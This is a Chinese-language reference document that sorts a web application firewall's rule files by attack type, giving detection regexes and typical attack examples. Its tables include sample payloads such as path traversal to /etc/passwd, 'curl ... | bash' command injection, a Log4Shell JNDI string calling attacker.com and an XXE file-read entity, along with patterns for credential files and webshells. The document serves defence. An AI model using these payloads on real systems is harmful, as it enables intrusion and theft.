# WAF 规则分类说明

本文档对 `wafconf/` 目录下所有规则文件中的规则按 **攻击类型 / 检测目标 / 风险等级** 进行分类，便于维护、扩展和按场景启用。

---

## 文件总览

| 规则文件 | 检测位置 | 防护目标 |
|---------|---------|---------|
| `args` | URL 查询参数、表单字段名/值 | 阻断通过请求参数传入的各类攻击 payload |
| `cookie` | HTTP Cookie 头内容 | 阻断通过 Cookie 传入的攻击 payload |
| `dangerous` | URI 路径 | 阻止访问敏感端点、已知漏洞路径、敏感文件 |
| `header` | HTTP 请求头 | 防止代理伪造、请求走私、Header 注入、DoS、CRLF 注入 |
| `method` | HTTP 请求方法 | 禁用危险 HTTP 方法和识别扫描器/RAT 特征 |
| `post` | HTTP POST 请求体 | 阻断通过 Body 传入的各类攻击 payload |
| `referer` | HTTP Referer 头 | 拦截垃圾流量和恶意 Referer |
| `response` | HTTP 响应体 | 识别服务端信息泄露（被动检测/告警） |
| `url` | URI 路径与扩展名 | 阻止访问版本控制、备份、源码、管理后台等敏感路径 |
| `user-agent` | HTTP User-Agent 头 | 识别并阻断爬虫、扫描器、测绘工具 |
| `whiteurl` | URI 路径 | 放行特定业务路径，避免误伤 |

---

## 1. `args` — 请求参数（Query / Args）检测

> **检测位置**：URL 查询参数、表单字段名/值等请求参数。  
> **防护目标**：Web 应用中最常见的攻击入口，参数可直接被后端解析执行，是 SQL 注入、命令注入、XSS 等攻击的主要载体。

| 分类编号 | 规则类别 | 说明 | 典型攻击场景 | 示例规则 |
|---------|---------|------|-------------|---------|
| A1 | 路径穿越 / LFI | 阻止 `../` 及其编码变种，防止读取服务器任意文件 | 攻击者通过 `?file=../../../etc/passwd` 读取系统文件 | `\.\./`、`\.\.%2f`、`%252e%252e`、`%c0%ae%c0%ae` |
| A2 | 基础 SQL 注入 | 匹配联合查询、信息_schema 等 SQL 注入特征 | 通过参数注入 SQL 语句绕过认证或拖库 | `select.+(from\|limit)`、`(?:(union(.*?)select))` |
| A3 | 时间 / 报错盲注 | 匹配延时函数和报错函数，用于无回显时探测数据库 | 盲注判断字段数、数据库版本 | `sleep\((\s*)(\d*)(\s*)\)`、`pg_sleep\s*\(`、`extractvalue\s*\(` |
| A4 | 堆叠查询 / 写文件 | 阻止多语句执行和文件写入操作 | 通过 `;DROP TABLE` 删表，或通过 `INTO OUTFILE` 写 WebShell | `;\s*(drop\|delete\|insert\|update\|create\|alter)\s+`、`into\s+(outfile\|dumpfile)\s+` |
| A5 | MySQL 注释绕过 | 匹配 MySQL 版本注释 `/*!50000 ... */`，用于绕过简单过滤 | 某些 WAF 不识别注释语法导致绕过 | `/\*!50000` |
| A6 | NoSQL 注入 | 匹配 MongoDB 等 `$` 操作符注入 | 通过 `?id[$ne]=1` 绕过身份验证 | `\[\$where\]`、`"\$ne"`、`"\$gt"` |
| A7 | 命令注入 | 匹配反引号、`$()`、管道下载执行等 OS 命令注入 | `?ip=127.0.0.1;cat /etc/passwd` 或 `curl ... \| bash` | `` `.*` ``、`\$\(.*\)`、`(curl\|wget).*\|.*(bash\|sh\|cmd\|powershell)` |
| A8 | 代码 / 文件包含执行 | PHP 危险函数、伪协议、Base64 解码 | `?file=php://filter/...` 或 `eval($_GET[x])` | `base64_decode\(`、`php://filter`、`php://input` |
| A9 | 模板注入 SSTI | Spring/Pebbles/FreeMarker 等模板表达式注入 | `?name=${T(java.lang.Runtime).getRuntime()}` | `\$\{.*class.*\}`、`\#\{.*\}` |
| A10 | SSRF / 伪协议 | gopher/file/dict/imap 等危险协议与内网 IP | 让服务端请求内网 Redis、文件系统或metadata 接口 | `(gopher\|file\|dict\|imap)\:/`、`127\.0\.0.1`、`10\.\d+\.\d+\.\d+` |
| A11 | XSS / HTML 注入 | 标签、事件处理器、DOM XSS payload | 在参数中植入 `<script>alert(1)</script>` 窃取用户 Cookie | `<(iframe\|script\|...)`,`(onmouseover\|onerror\|onload)\=` |
| A12 | XML / XXE | 外部实体声明，导致文件读取、SSRF、内网探测 | `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | `<!ENTITY`、`<!DOCTYPE.*SYSTEM` |
| A13 | 反序列化 | Java Fastjson/Jackson、PHP、.NET 序列化特征 | 通过可控序列化数据触发 RCE | `"@type"`、rO0ABX、`O:\d+:"[^"]+":\d+:\{` |
| A14 | JNDI / Log4Shell | Log4j JNDI 注入 (CVE-2021-44228) | `${jndi:ldap://attacker.com/exp}` 触发 RCE | `\$\{jndi:(ldap\|dns\|rmii\|...)` |
| A15 | Spring4Shell | Spring 框架 classloader 注入 (CVE-2022-22965) | 修改 Tomcat 访问日志配置写入 WebShell | `class\.module\.classLoader` |
| A16 | JWT 算法绕过 | JWT 使用 `none` 算法绕过签名验证 | `{"alg":"none"}` 配合篡改 payload 越权 | `"alg"\s*:\s*"none"` |
| A17 | 文件上传绕过 | 双扩展名、图片马等绕过服务端后缀检查 | 上传 `shell.php.jpg` 或 `GIF89a...<?php ...` | `\.(php\d?\|jsp\|...)\.(jpg\|jpeg\|...)`、`GIF89a.*<\?php` |
| A18 | OOB / DNS 外带 | 外带域名特征，用于盲注、命令执行确认 | `whoami.attacker.dnslog.cn` | `\.(burpcollaborator\.net\|interact\.sh\|dnslog\.cn\|...)` |

---

## 2. `cookie` — Cookie 值检测

> **检测位置**：HTTP Cookie 头内容。  
> **防护目标**：Cookie 常被攻击者用来投递持久化 payload，尤其是反序列化、JNDI 注入和 JWT 绕过。Cookie 检测规则通常比 `args` 更精简，聚焦高风险特征。

| 分类编号 | 规则类别 | 说明 | 典型攻击场景 | 示例规则 |
|---------|---------|------|-------------|---------|
| C1 | SQL 注入 | Cookie 中常见的 SQLi payload | `Cookie: id=1 union select ...` | 同 A2、A3 部分规则 |
| C2 | 代码 / 文件包含 | Cookie 中的 PHP 危险函数与伪协议 | `Cookie: file=php://filter/...` | `base64_decode\(`、`php://filter` |
| C3 | JNDI / Log4Shell | Cookie 中植入 JNDI 地址 | 利用 Log4j 记录 Cookie 值触发 JNDI | `\$\{jndi:(ldap\|dns\|...)\}` |
| C4 | JWT 算法绕过 | Cookie 中 JWT 使用 none 算法 | 篡改 session JWT 的 alg 为 none | `"alg"\s*:\s*"none"` |
| C5 | 反序列化 | Cookie 中的 Java/PHP 序列化特征 | Java 框架 remember-me Cookie 反序列化 RCE | `"@type"`、rO0ABX |

---

## 3. `dangerous` — 危险路径 / 文件 / 端点

> **检测位置**：URI 路径，命中表示请求了敏感资源或已知漏洞入口。  
> **防护目标**：直接屏蔽不应暴露在互联网上的管理后台、调试端点、敏感文件和已知 CVE 利用路径。文件内按 `# [core]` 和 `# [aggressive]` 分组。  
> **路径混淆归一化**：匹配前先按原始 `request_uri` 匹配，未命中再对 `init.lua` 的 `normalize_uri` 归一化结果匹配（多重 URL 解码、剥离 `;` 路径参数、反斜杠转正、合并连续斜杠、解析 `.`/`..` 点段、去末尾斜杠/点/空格、去控制字符），覆盖 `;.js`、`%3b`、`..;/`、`//`、`/./`、尾斜杠等混淆变体，只新增命中、不影响既有命中。

| 分类编号 | 规则类别 | 说明 | 典型风险 | 示例规则 |
|---------|---------|------|---------|---------|
| D1 | 隐藏文件 / 目录 | 根路径下以 `.` 开头的资源 | 暴露 `.env`、`.git`、`.htaccess` 等 | `^/\..*$` |
| D2 | Spring Boot Actuator | 敏感端点（env/heapdump/mappings 等）、根路径端点索引、`;` 路径参数混淆变体；规则用 `(?:^|/)` 段边界锚定，兼容子路径/上下文根部署（如 `/myapp/actuator/env`） | 泄露环境变量、配置、甚至完整堆内存 | `(?:^|/)actuator/(env\|beans\|heapdump\|...)$`、`(?:^|/)actuator/?$`、`(?:^|/)actuator;` |
| D3 | Swagger / OpenAPI | API 文档接口暴露 | 攻击者通过文档快速发现可利用接口 | `swagger\.json`、`^/swagger-ui(/.*)?$`、`^/v[23]/api-docs` |
| D4 | phpinfo / 状态页 | 服务器信息与调试页 | 泄露 PHP 版本、模块、路径、环境变量 | `^/phpinfo\.php$`、`^/nginx_status$` |
| D5 | 调试工具 / 性能分析 | pprof、debugbar、profiler | 泄露内存、CPU、源码、SQL 等信息 | `^/debug/pprof(/.*)?$`、`^/_debugbar(/.*)?$` |
| D6 | AI / Notebook 平台 | Gradio、Streamlit、Jupyter 入口 | 这些平台常缺乏认证，暴露后可执行代码 | `^/(gradio\|streamlit\|jupyter\|notebook)(/.*)?$` |
| D7 | CMS / 框架后台与安装入口 | WordPress、ThinkPHP、通用 admin/install | 弱口令爆破、未授权安装、配置泄露 | `^/wp-(login\|config\|admin)`、`^/thinkphp(/.*)?$` |
| D8 | 上传目录脚本执行 | 上传目录中执行脚本 | 绕过上传限制后执行 WebShell | `^/(upload\|uploads\|...)/.*\.(php\d*\|jsp\|asp\|...)$` |
| D9 | 已知高危 CVE / 通用漏洞路径 | PHPUnit RCE、WebLogic、JBoss、Solr、通达、帆软、Ueditor 等 | 一键利用已知漏洞获取权限 | `/vendor/phpunit/.../eval-stdin\.php`、`/_async/AsyncResponseService` |
| D10 | 代理滥用 / SSRF | 请求 URI 为完整 URL | 将服务器作为代理访问内网或外网 | `^https?://` |
| D11 | 敏感配置文件泄露 | env/ini/yml/properties 等 | 泄露数据库密码、API Key、业务配置 | `\.(env\|ini\|conf\|config\|properties\|yml\|yaml)$` |
| D12 | 密钥 / 证书文件泄露 | pem/key/p12/jks 等 | 私钥泄露导致 HTTPS 会话可被解密 | `\.(pem\|key\|p12\|pfx\|jks\|keystore\|...)$` |
| D13 | IaC / Terraform 状态泄露 | tfstate 等 | Terraform state 常包含明文密码 | `\.(tf\|tfvars\|tfstate|tfstate\.backup)$` |
| D14 | 数据库 / 备份文件泄露 | sql/sqlite/db/dump/heapdump | 直接拖库 | `\.(sql\|sqlite\|sqlite3\|db\|dump\|hprof|heapdump)$` |
| D15 | SSH / 凭证密钥泄露 | id_rsa、authorized_keys | 私钥泄露可直接登录服务器 | `(id_(rsa\|dsa\|ecdsa\|ed25519)\|authorized_keys\|known_hosts)$` |
| D16 | 应用凭证 / 通用配置文件 | credentials/secrets/application/config | 明文存储的密钥和连接信息 | `(credentials\|secrets?\|application\|config)\.(json\|ya?ml\|...)$` |
| D17 | 构建依赖与锁文件 | package-lock、composer.lock、pom.xml 等 | 泄露依赖版本，辅助 CVE 定向攻击 | `package(-lock)?\.json`、`composer\.(json\|lock)`、pom\.xml |
| D18 | Docker / CI / 进程配置 | Dockerfile、docker-compose、Jenkinsfile | 泄露镜像构建细节、CI 凭据 | `Dockerfile`、`docker-compose.*\.ya?ml`、`Jenkinsfile` |
| D19 | K8s / Helm / Ansible | Chart.yaml、values.yaml、kustomization.yaml | 泄露集群配置、镜像拉取密钥 | `Chart\.ya?ml`、`values(-.*)?\.ya?ml` |
| D20 | 系统 shell / 敏感路径探测 | /bin/bash、/etc/passwd、cmd.exe | 路径穿越或命令执行探测 | `/bin/(ba)?sh`、`/etc/passwd`、`cmd\.exe` |
| D21 | WebShell / 命令执行文件名 | 常见 webshell 命名 | 已上传 WebShell 的访问路径 | `(webshell\|c99\|r57\|shell\|cmd\|exec)\.(php\|jsp\|...)` |
| D22 | Java 监控 / 控制台 | Druid、H2 Console、Jolokia | 未授权访问数据库、执行 MBean 操作 | `^/druid(/.*)?$`、`^/h2-console(/.*)?$` |
| D23 | Git / 版本控制泄露 | .git 目录、.git-credentials | 源码、仓库凭据泄露 | `\.git/`、`\.git-credentials` |
| D24 | LLM / OpenAI API 探测 | 模型、嵌入、补全接口 | 未授权调用大模型 API，造成资源滥用 | `^/v1/(models\|embeddings\|chat/completions\|completions\|images\|audio\|files\|fine-tunes\|batches\|assistants\|threads\|vector_stores\|moderations\|realtime)$` |
| D25 | 版本 / API 根路径探测 | 通用探测 | 测绘、版本识别 | `^/version$`、`^/v1$` |
| D26 | 激进模式：健康检查 / Metrics | 可能误伤 K8s 探针、Prometheus | 业务若不需要暴露则禁用 | `^/health$`、`^/metrics(/.*)?$` |
| D27 | 激进模式：调试 / 测试目录 | backup/test/debug/tmp 等 | 误伤风险高，按需启用 | `^/(backup\|backups\|test\|tests\|debug\|tmp\|...)(/.*)?$` |
| D28 | 激进模式：源码 / 日志 / 备份扩展名 | 误伤风险高 | 技术类站点可能正常提供源码/日志下载 | `\.(java\|class\|jar\|py\|sh\|log\|bak\|backup\|...)$` |
| D29 | VPN / 远程接入设备探测 | Citrix NetScaler、SSL VPN 接口 | 未授权访问或 CVE 利用 | `^/vpnsvc/connect\.cgi$`、`^/epa/scripts/win/nsepa_setup\.exe$` |

> **说明**：以 `# [core]` 标注的规则为默认启用，误伤较低；以 `# [aggressive]` 标注的规则误伤风险较高，按需启用（`BlockAggressive=on` 时生效）。
> 自 2026-07 起，与常见业务路由冲突的通用名词路径（`/dashboard`、`/docs`、`/jobs`、`/api/auth/*`、`/v1/auth`、`/wiki`、`/console`、`/play`、`/stats` 等）也已归入 `[aggressive]`，core 区只保留指向性明确的敏感路径。

---

## 4. `header` — HTTP 请求头检测

> **检测位置**：HTTP 请求头（Header 名称和值）。  
> **防护目标**：HTTP 头常被用于绕过 IP 限制、走私请求、注入 payload 或实施 DoS。

| 分类编号 | 规则类别 | 说明 | 典型攻击场景 | 示例规则 |
|---------|---------|------|-------------|---------|
| H1 | 代理伪造 / IP 欺骗 | 伪造 X-Forwarded-*、Client-IP 等绕过 IP 限制 | 攻击者伪造 `X-Forwarded-For: 127.0.0.1` 绕过访问控制 | `^X-Forwarded-Host:`、含内网 IP 的 X-Forwarded-For |
| H2 | HTTP 请求走私 | 同时出现 Transfer-Encoding 等走私特征 | 前端代理与后端服务器解析不一致，导致请求边界混乱 | `^Transfer-Encoding:` |
| H3 | Header 注入攻击 | Cookie/User-Agent 等头中植入 SQLi/XSS/JNDI | 把 payload 写入 Header 绕过参数检测 | `sleep\(`、`union\s+select`、`<script`、`\$\{jndi:` |
| H4 | DoS / 超大请求 | 异常巨大的 Content-Length | 发送超大 Body 耗尽服务端内存/磁盘 | `^Content-Length:\s*(9\d{8}\|\d{10,})` |
| H5 | CRLF 注入 | 头值中出现换行符 | 注入额外 HTTP 头或分割响应，实施 XSS/缓存投毒 | `\n`、`\r` |
| H6 | 激进模式：所有转发头 | 全部 X-Forwarded-* 头 | 在可信任反向代理场景下误伤高，仅 `BlockAggressive=on` 时生效 | `^X-Forwarded-` |
| H7 | 激进模式：自定义 IP 头 | 所有 `X-.*-IP:` 头 | 部分自定义 IP 头可能用于业务，启用需谨慎 | `^X-.*-IP:` |

---

## 5. `method` — HTTP 方法检测

> **检测位置**：HTTP 请求方法（Method）。  
> **防护目标**：危险方法可导致文件写入、移动、删除；非标准方法常被扫描器或木马使用。

| 分类编号 | 规则类别 | 说明 | 典型风险 | 示例规则 |
|---------|---------|------|---------|---------|
| M1 | WebDAV / 危险 HTTP 方法 | 可导致写文件、移动、复制的 WebDAV 方法 | 利用 PUT/MOVE 上传 WebShell | `TRACE`、`TRACK`、`PROPFIND`、`MKCOL`、`MOVE`、`COPY`、`LOCK`、`UNLOCK`、`SSTP_DUPLEX_POST` |
| M2 | 扫描器 / 探测协议非标准方法 | 特定扫描器使用自定义方法前缀 | 识别并阻断自动化探测 | `KYIT`、`MGLNDD_`、`OFSC` |
| M3 | RAT / 远控木马通信特征 | AsyncRAT / QuasarRAT 等上线 / 字段特征 | 识别已知木马明文或 Base64 通信 | `HacKed_`、`clienta\.exe`、`AA==`、`|'|'|` |

---

## 6. `post` — POST 请求体检测

> **检测位置**：HTTP POST 请求体（Body）。  
> **防护目标**：POST Body 是 SQL 注入、命令注入、反序列化、文件上传等攻击的另一主要载体，与 `args` 逻辑基本一致。

| 分类编号 | 规则类别 | 说明 | 典型攻击场景 | 示例规则 |
|---------|---------|------|-------------|---------|
| P1-P18 | 同 `args` 分类 A1-A18 | POST Body 同样可能出现 SQLi、XSS、RCE、SSRF、反序列化等攻击 | JSON/XML/表单/文件上传中的恶意 payload | 与 `args` 基本一致 |

---

## 7. `referer` — Referer 黑名单

> **检测位置**：HTTP Referer 头。  
> **防护目标**：拦截来自已知垃圾流量、SEO 作弊或 CC 攻击源的 Referer。

| 分类编号 | 规则类别 | 说明 | 典型攻击场景 | 示例规则 |
|---------|---------|------|-------------|---------|
| R1 | 垃圾 / 恶意 Referer | 用于 SEO 垃圾、CC 攻击、流量劫持的 Referer | 大量垃圾 Referer 消耗带宽、污染统计 | `semalt`、`darodar`、`buttons-for-website` |

---

## 8. `response` — 响应内容检测（信息泄露）

> **检测位置**：HTTP 响应体（Response Body）。  
> **防护目标**：此类规则通常用于**被动检测/告警**，发现服务端返回了过多错误信息、路径、密钥或框架版本。

| 分类编号 | 规则类别 | 说明 | 典型风险 | 示例规则 |
|---------|---------|------|---------|---------|
| S1 | Java 堆栈跟踪泄露 | Java 异常堆栈 | 泄露包名、类名、行号，辅助反编译与漏洞定位 | `java\.lang\.(NullPointerException\|...)` |
| S2 | Python 堆栈泄露 | Python Traceback | 泄露源码路径与逻辑 | `Traceback\s+\(most\s+recent\s+call\s+last\)` |
| S3 | PHP 错误泄露 | PHP Fatal/Parse/Warning/Notice | 泄露文件路径、函数参数 | `Fatal\s+error:`、`Warning:\s+.*in\s+.*on\s+line` |
| S4 | .NET 错误泄露 | ASP.NET 异常页 | 泄露源码片段与服务器配置 | `Server\s+Error\s+in\s+'/'\s+Application` |
| S5 | 数据库错误泄露 | Oracle/MySQL/PostgreSQL/MongoDB 错误 | 泄露数据库类型、版本、表结构 | `ORA-\d{5}`、`MySQL\s+server\s+has\s+gone\s+away` |
| S6 | 内部路径泄露 | 服务器绝对路径暴露 | 辅助 LFI/路径穿越攻击 | `/home/\w+/`、`/var/www/`、`C:\\\w+\\` |
| S7 | 数据库连接串泄露 | JDBC/MongoDB/Redis 连接字符串 | 泄露数据库账号密码 | `jdbc:mysql://`、`mongodb://`、`redis://` |
| S8 | 密钥 / Token 泄露 | 私钥、API Key、GitHub Token | 私钥或服务凭证被意外输出 | `-----BEGIN\s+RSA\s+PRIVATE\s+KEY`、`sk-[a-zA-Z0-9]{48}` |
| S9 | 框架指纹 / 版本泄露 | CMS/框架版本信息 | 辅助 CVE 定向攻击 | `X-Powered-By:`、`WordPress\s+\d+\.\d+` |

---

## 9. `url` — URI 路径 / 扩展名检测

> **检测位置**：URI 路径与扩展名。  
> **防护目标**：阻断针对隐藏文件、备份文件、源码、管理后台和特定协议的探测。

| 分类编号 | 规则类别 | 说明 | 典型风险 | 示例规则 |
|---------|---------|------|---------|---------|
| U1 | 版本控制 / 隐藏文件泄露 | .git/.svn/.htaccess/.env 等 | 源码与配置泄露 | `\.(git\|svn\|htaccess\|env\|gitignore\|...)` |
| U2 | 备份 / 源码 / 数据库文件 | bak/inc/old/sql/backup/java/class | 直接下载源码或数据库备份 | `\.(bak\|inc\|old\|mdb\|sql\|backup\|java\|class)$` |
| U3 | 管理后台 / 控制台探测 | phpMyAdmin、JMX Console | 未授权管理入口 | `(phpmyadmin\|jmx-console\|jmxinvokerservlet)` |
| U4 | 面板 / 路由探测 | xui、panel、boaform、cgi-bin | 路由器/面板默认入口被利用 | `^/(xui\|panel)(/.*)?$`、`^/cgi-bin(/.*)?$` |
| U5 | 上传目录脚本执行 | 常见上传目录中 PHP/JSP 文件 | 已上传 WebShell 被执行 | `/(attachments\|uploads\|...)/(\\w+).(php\|jsp)` |
| U6 | SMB 协议探测 | EternalBlue、SMB 服务枚举 | 内网横向移动与勒索软件传播 | `(SMBr\|SMB@\|NT LM 0\.12)` |

---

## 10. `user-agent` — User-Agent 黑名单

> **检测位置**：HTTP User-Agent 头。  
> **防护目标**：识别并阻断自动化爬虫、漏洞扫描器、资产测绘平台和部分命令行客户端。

| 分类编号 | 规则类别 | 说明 | 典型风险 | 示例规则 |
|---------|---------|------|---------|---------|
| UA1 | 搜索引擎 / 合规爬虫 | AI 搜索爬虫或部分国产搜索引擎 | 可能过度抓取或用于 AI 训练 | `Amazonbot`、`OAI-SearchBot`、`GPTBot`、`YisouSpider` |
| UA2 | 常见爬虫 / 数据采集 | 未授权自动化采集工具 | 内容盗用、性能消耗 | `SemrushBot`、`pyspider`、`Scrapy`、`HTTrack` |
| UA3 | Web 漏洞扫描器 | 主动式安全扫描 / 攻击工具 | 批量漏洞探测与利用 | `nikto`、`acunetix`、`masscan`、`wpscan`、`sqlmap` |
| UA4 | 资产测绘 / 目录爆破 | 互联网测绘与暴力枚举工具 | 快速发现暴露面 | `Nuclei`、`Censys`、`Shodan`、`ZoomEye`、`Gobuster` |
| UA5 | 商业 / 组织扫描器 | 商业测绘平台、LeakIX 等 | 持续性互联网暴露面扫描 | `l9explore`、`LeakIX`、`Palo\s*Alto`、`Cortex\s*Xpanse`、`Infrawatch` |
| UA6 | HTTP Banner / 指纹识别 | 仅做 Banner 识别的扫描器 | 收集技术栈指纹 | `HTTP\s+Banner\s+Detection`、`ipip\.net` |
| UA7 | 开发工具 / 命令行客户端 / 极简伪造 UA | curl、wget、ab、Postman、Go/Java 客户端，以及单字符伪造 UA | 自动化脚本、扫描器或测试流量，按需限制 | `curl`、`wget`、`ApacheBench`、`PostmanRuntime`、`Go-http-client`、`^M$` |

---

## 11. `whiteurl` — URL 白名单

> **检测位置**：URI 路径。  
> **作用**：**放行**特定路径，优先级通常高于黑名单，避免正常业务被误拦截。

| 分类编号 | 规则类别 | 说明 | 典型用途 | 示例规则 |
|---------|---------|------|---------|---------|
| W1 | 业务接口白名单 | 明确允许访问的业务接口 | 避免核心接口被通用规则误伤 | `^/userAction/saveUserActionData`、`^/console/api/apps/*` |
| W2 | 文件上传白名单 | 允许文件上传接口 | 确保正常上传通道不被阻断 | `^/files/upload/*` |
| W3 | 标准 ACME / Well-Known | 证书验证等标准路径 | Let's Encrypt 等证书自动续期 | `^/\.well-known(/.*)?$` |

---

## 规则启用建议

| 场景 | 推荐启用文件 | 可选启用 |
|------|-------------|---------|
| 生产环境基础防护 | `args`、`post`、`cookie`、`header`（core）、`url`、`method`、`dangerous`（core） | `response`（按需记录泄露） |
| 高安全 / 内网资产 | 上述全部 + `dangerous`（aggressive）、`header`（aggressive） | `user-agent` |
| 防爬虫 / 防测绘 | `user-agent`、`referer` | `url` |
| 敏感数据防泄露 | `response`、`dangerous`（D11-D24） | - |

---

## 维护规范

新增规则时，请在规则旁添加分类注释，格式如下：

```
# [A7] 命令注入 - 管道下载执行
(curl|wget).*\|.*(bash|sh|cmd|powershell)
```

注释应包含：
1. **分类编号**：如 `[A7]`、`[D12]`
2. **中文类别名**：如 `命令注入`
3. **简短说明**（可选）：如 `管道下载执行`

这样既便于阅读，也便于后续按类别批量启用、禁用或审计。
